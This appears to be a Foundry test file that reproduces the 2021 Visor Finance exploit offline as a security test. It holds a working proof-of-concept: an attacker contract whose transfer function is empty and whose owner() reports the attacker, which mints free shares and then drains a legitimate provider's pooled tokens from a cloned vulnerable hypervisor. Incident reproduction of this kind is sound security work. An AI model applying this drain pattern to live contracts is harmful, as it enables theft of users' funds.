// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {VisorHypervisorClone, IERC20Like} from
    "../fixtures/malicious-calldata/b-incident/VisorHypervisorClone.sol";

/// @dev The attacker's caller-supplied "visor": its transfer is a no-op (moves nothing) and it
///      reports itself (hence the attacker) as `owner`. The hypervisor trusts both.
contract EvilVisor {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function owner() external view returns (address) {
        return attacker;
    }

    function delegatedTransferERC20(address, address, uint256) external {
        // deliberately empty: no tokens are actually delivered to the hypervisor
    }
}

/// @title malicious-calldata tier (b): Visor Finance delegated-transfer drain (2021-12-21).
/// @notice Minimized offline reproduction of the documented mechanism: the vVISR rewards
///         hypervisor's deposit trusted a caller-supplied contract for both the token pull
///         (`delegatedTransferERC20`) and the share recipient (`owner()`), without verifying a
///         real transfer. An attacker-supplied contract that moves nothing but claims the
///         attacker as owner mints free shares; the attacker then withdraws real pooled VISR.
///         Verdict is derived from the real outcome: the pool is drained. See PROVENANCE.md.
contract VisorIncidentTest is Test {
    uint256 constant SEED = 8_000_000e18; // representative pooled VISR (scaled)
    address constant LP = address(0x11b0); // a legit liquidity provider
    address constant ATTACKER = address(0xBAD44);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_visor_delegatedTransfer_drainsPool() public {
        MockERC20 visr = new MockERC20();
        VisorHypervisorClone hypervisor = new VisorHypervisorClone(IERC20Like(address(visr)));

        // A legit LP seeds real VISR into the pool.
        visr.mint(LP, SEED);
        vm.startPrank(LP);
        visr.approve(address(hypervisor), SEED);
        hypervisor.seed(SEED);
        vm.stopPrank();
        assertEq(visr.balanceOf(address(hypervisor)), SEED, "pool seeded");

        // ATTACK: deposit with a caller-supplied "visor" that moves nothing but claims the
        // attacker as owner -> free shares, no real deposit.
        EvilVisor evil = new EvilVisor(ATTACKER);
        vm.prank(ATTACKER);
        hypervisor.deposit(SEED, address(evil));
        assertEq(hypervisor.shares(ATTACKER), SEED, "attacker minted free shares");

        // The attacker withdraws the legit LP's pooled VISR against the free shares.
        vm.prank(ATTACKER);
        hypervisor.withdraw(SEED);

        bool drained = (visr.balanceOf(ATTACKER) == SEED && visr.balanceOf(address(hypervisor)) == 0);
        _report("visor-delegated-transfer-victim", drained);

        assertTrue(drained, "caller-supplied delegated transfer should drain the pool");
        assertEq(visr.balanceOf(ATTACKER), SEED, "attacker drained the pooled VISR");
    }
}
